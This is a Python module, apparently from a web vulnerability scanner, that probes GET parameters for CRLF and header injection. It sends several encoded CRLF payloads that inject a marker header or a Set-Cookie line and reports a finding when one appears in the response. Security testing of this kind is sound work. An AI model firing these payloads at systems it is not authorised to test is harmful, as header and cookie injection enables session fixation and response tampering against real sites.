"""CRLF / header injection scanner.

Probes every parameter for `%0d%0a` injection that lands in a response
header. Two detection paths:

  1. **In-band** — server reflects the injected `Set-Cookie:` /
     `X-Custom:` line in its response headers (we inspect the raw header
     map after a non-redirected request).
  2. **Status code split** — splits the response with `%0d%0a%0d%0aHTTP/1.1
     200 OK` and watches for an unusual second-status indicator.

Reflected-header injection still pays out on legacy CDNs / WAFs and any
self-rolled HTTP server.
"""
from __future__ import annotations

import asyncio
from typing import TYPE_CHECKING

from core.utils import merge_query, random_token

if TYPE_CHECKING:
    from core.orchestrator import Context

PAYLOAD_TEMPLATES = [
    "test%0d%0aSX-Inject-{tok}: pwn",
    "test%0d%0aSet-Cookie: sx={tok}",
    "test%0aSX-Inject-{tok}: pwn",
    "test%23%0d%0aSX-Inject-{tok}: pwn",
    "test\r\nSX-Inject-{tok}: pwn",
    "test%E5%98%8A%E5%98%8DSX-Inject-{tok}: pwn",  # UTF-8 over-long encoded CRLF
]


async def scan(ctx: "Context", url: str, params: list[str], method: str = "GET", form=None):
    findings: list[dict] = []
    if method.upper() != "GET" or not params:
        return findings
    sem = asyncio.Semaphore(int(ctx.config.get("concurrency", {}).get("scanner_workers", 8)))

    async def test(param: str) -> None:
        from core.injection import send
        for tpl in PAYLOAD_TEMPLATES:
            tok = random_token(6)
            payload = tpl.format(tok=tok)
            async with sem:
                ev = await send(ctx, url, method, param, payload, form, allow_redirects=False)
            if ev.error or not ev.response_headers:
                continue
            for hk, hv in ev.response_headers.items():
                hk_l = hk.lower()
                hv_s = str(hv)
                if (hk_l.startswith("sx-inject-") and tok in hk_l) or \
                   (hk_l == "set-cookie" and f"sx={tok}" in hv_s):
                    findings.append({
                        "category": "crlf",
                        "title": f"CRLF / header injection in `{param}`",
                        "severity": "high", "cvss": 7.4,
                        "url": url, "parameter": param, "payload": payload,
                        "evidence": f"Injected header surfaced in the response header map "
                                    f"as `{hk}: {hv_s[:80]}` — server is concatenating user "
                                    "input into the response header section.",
                        "request": f"{ev.method} {ev.url}",
                        "response": str({k: v for k, v in ev.response_headers.items()})[:1500],
                        "metadata": {"injected_header": hk, "token": tok},
                    })
                    return

    await asyncio.gather(*(test(p) for p in params))
    return findings
